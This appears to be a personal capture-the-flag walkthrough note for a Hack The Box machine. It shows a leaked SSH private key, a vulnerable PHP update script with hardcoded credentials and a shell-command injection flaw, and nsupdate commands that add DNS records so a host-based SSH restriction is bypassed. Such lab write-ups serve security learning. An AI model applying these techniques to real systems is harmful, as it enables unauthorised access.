# User

private_key for bindmgr found at `/home/bindmgr/support-case-C62796521`

![[Pasted image 20211017074518.png]]

copy to your machine use vim editor to replace new line

```vim

:s/\\n/\r/g

```

sshing using private key is not working.

![[Pasted image 20211017075036.png]]

Entry is only allowed from a patricular domain `.infra.dyna.htb`

looking at update file at /var/www/html/nic we can our ip to that domain using nsupdate to create new DNS record

```php
www-data@dynstr:/var/www/html/nic$ cat update 
<?php
  // Check authentication
  if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']))      { echo "badauth\n"; exit; }
  if ($_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo "badauth\n"; exit; }

  // Set $myip from GET, defaulting to REMOTE_ADDR
  $myip = $_SERVER['REMOTE_ADDR'];
  if ($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP))                       { $myip = $valid; }

  if(isset($_GET['hostname'])) {
    // Check for a valid domain
    list($h,$d) = explode(".",$_GET['hostname'],2);
    $validds = array('dnsalias.htb','dynamicdns.htb','no-ip.htb');
    if(!in_array($d,$validds)) { echo "911 [wrngdom: $d]\n"; exit; }
    // Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
    // Return good or 911
    if (!$retval) {
      echo "good $myip\n";
    } else {
      echo "911 [nsupdate failed]\n"; exit;
    }
  } else {
    echo "nochg $myip\n";
  }
?>
```


```bash
www-data@dynstr:/var/www/html/nic$ nsupdate -t 1 -k /etc/bind/infra.key 
> ADD aju.infra.dyna.htb 30 IN A 10.10.14.91
> send
> ADD 91.14.10.10.in-addr.arpa 30 IN PTR aju.infra.dyna.htb
> send
```

![[Pasted image 20211017084635.png]]

[[Root]]
